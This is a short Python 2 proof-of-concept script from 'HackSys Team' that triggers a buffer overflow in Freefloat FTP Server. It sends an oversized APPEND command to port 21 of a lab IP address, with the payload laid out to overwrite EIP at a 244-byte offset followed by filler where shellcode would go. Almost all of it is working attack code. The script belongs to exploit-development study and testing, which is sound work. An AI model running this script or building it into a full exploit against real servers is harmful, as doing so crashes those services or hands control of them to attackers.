#!/usr/bin/python
import socket, sys, os, time
 
print "\n+---------------------------------------+"
print "+  Freefloat FTP Server Buffer Overflow +"
print "+       HackSys Team - Panthera         +"
print "+            Ashfaq Ansari              +"
print "+       hacksysteam@hotmail.com         +"
print "+      http://hacksys.vfreaks.com/      +"
print "+---------------------------------------+\n"

#Target IP address
target = "192.168.96.131"
#Target Port
port = 21

#Send 244 bytes of junk bytes
junk = "A" * 244

#EIP overwrite offset
eip = "BBBB"

junk2 = "C" * 8

#ESP offset
esp = "D" * 600

#Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[+] Connecting to %s on port %d" % (target,port)
try:
	#Connect to target port
    s.connect((target,port))
	#Receive 1024 bytes
    s.recv(1024)
    print "[+] Triggering Vulnerability - Sending junk data"
	#Send vulnerable command
    s.send("APPEND " + junk + eip + junk2 + esp + "\r\n")
	#Close the socket
    s.close()
    print "[+] Check your debugger for a crash."

except:
    print "[-] Could not connect to %s on port %d" % (target,port)
	#Exit the exploit
    sys.exit(0)
    
